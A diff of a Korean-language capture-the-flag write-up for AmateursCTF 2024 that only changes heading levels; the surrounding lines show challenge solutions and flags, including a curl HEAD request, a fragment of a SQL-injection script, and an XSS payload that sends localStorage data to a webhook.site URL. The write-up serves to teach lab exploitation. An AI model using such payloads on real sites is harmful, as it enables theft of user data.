@@ -6,8 +6,8 @@ tags: AmateursCTF
 category: ctf
 ---
       
-### CTFtime: https://ctftime.org/event/2226            
-### Official URL: https://ctf.amateurs.team/	    
+## CTFtime: https://ctftime.org/event/2226            
+## Official URL: https://ctf.amateurs.team/	    
        
 # Team Score	    
      
@@ -66,7 +66,7 @@ GET,HEAD
 ```      
 `OPTIONS` 요청을 통해 서버가 어떤 요청을 지원하는지 알 수 있다.    
 
-### Exploit Code 
+## Exploit Code 
 ```bash
 curl -X HEAD -i http://denied.amt.rs/ 
 
@@ -80,7 +80,7 @@ Set-Cookie: flag=amateursCTF%7Bs0_m%40ny_0ptions...%7D; Path=/
 X-Powered-By: Express
 ```             
        
-### Flag     
+## Flag     
 amateursCTF{s0_m@ny_0ptions...}
            
 <a id="agile-rut"></a>  
@@ -106,7 +106,7 @@ amateursCTF{0k_but_1_dont_like_the_jbmon0_===}
            
 Flag Format이 분명 `amateursCTF{}`라고 되어있었는데 ... 어이가 없는 문제였다.          
                
-### Flag
+## Flag
 amateursctf{0k_but_1_dont_like_the_jbmon0_===}          
                            
 <a id="one-shot"></a>     
@@ -146,7 +146,7 @@ def search():
 
 하지만, 접근 횟수 문제는 `/new_session`을 통해 새로운 `id` 값을 받아주면 된다. Injection Query에서 `table_{id}` 값을 지정해주면 패스워드를 알아낼 수 있다.        
                     
-### Exploit Code 
+## Exploit Code 
 ```python
 import requests 
 
@@ -182,7 +182,7 @@ print(r.text)
 ```       
 <img src="/assets/images/ctf/2024/amateurs/one-shot/flag.jpg" width="700px">     
        
-### Flag            
+## Flag            
 amateursCTF{go_union_select_a_life}       
              
 <a id="sculpture"></a>  
@@ -260,7 +260,7 @@ document.addEventListener("DOMContentLoaded",function(ev){
           
 XSS 취약점을 통해 `alert(1)`이 잘 출력되는 것을 확인할 수 있다. 
                          
-### Exploit Code 
+## Exploit Code 
 ```python
 # https://amateurs-ctf-2024-sculpture-challenge.pages.dev/?code=cHJpbnQoIjxpbWcgc3JjPXggb25lcnJvcj1sb2NhdGlvbi5ocmVmPWBodHRwczovL3dlYmhvb2suc2l0ZS80Zjg1OGVhMS03YjFkLTRlNjAtYmUxNi01Mzk0YTZhYTY3M2EvP2M9YCtsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnZmxhZycpPiIp
 print("<img src=x onerror=location.href=`https://webhook.site/4f858ea1-7b1d-4e60-be16-5394a6aa673a/?c=`+localStorage.getItem('flag')>")
@@ -268,7 +268,7 @@ print("<img src=x onerror=location.href=`https://webhook.site/4f858ea1-7b1d-4e60
              
 <img src="/assets/images/ctf/2024/amateurs/sculpture/flag.jpg" width="700px">           
             
-### Flag     
+## Flag     
 amateursCTF{i_l0v3_wh3n_y0u_can_imp0rt_xss_v3ct0r}          
                              
 <!-- # creative-login-page-challenge        
